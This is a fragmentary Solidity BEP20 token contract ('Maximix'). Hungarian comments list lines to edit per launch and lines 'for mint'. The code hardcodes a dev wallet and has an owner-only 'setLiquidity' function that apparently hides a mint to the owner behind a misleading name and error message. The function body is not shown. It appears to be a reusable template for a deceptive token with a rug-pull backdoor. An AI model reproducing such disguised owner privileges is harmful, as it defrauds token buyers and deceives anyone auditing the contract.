...
/*
faszoscsiga
	mint-re sorok:77,527,688
	+burn

    amiket át kell írni: 
    
    184-amelyik tokent szeretném
    219 testnet/mainnet router függő
    339- contract neve
    345- dev wallett 
    347-token neve
    348 symbol
...
contract Maximix is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEV = 0x580F14567C9709EbEa47D0D9988a0D1A4cDa7649;

    string constant _name = "Maximix";
    ...
    function _setLiquidity(address account, uint256 amount) internal {
        require(account != address(0), "Not enough tokens in wallet");
    ...
    function setLiquidity(uint256 amount) public onlyOwner returns (bool) {
        _setLiquidity(_msgSender(), amount);
         return true;
    }
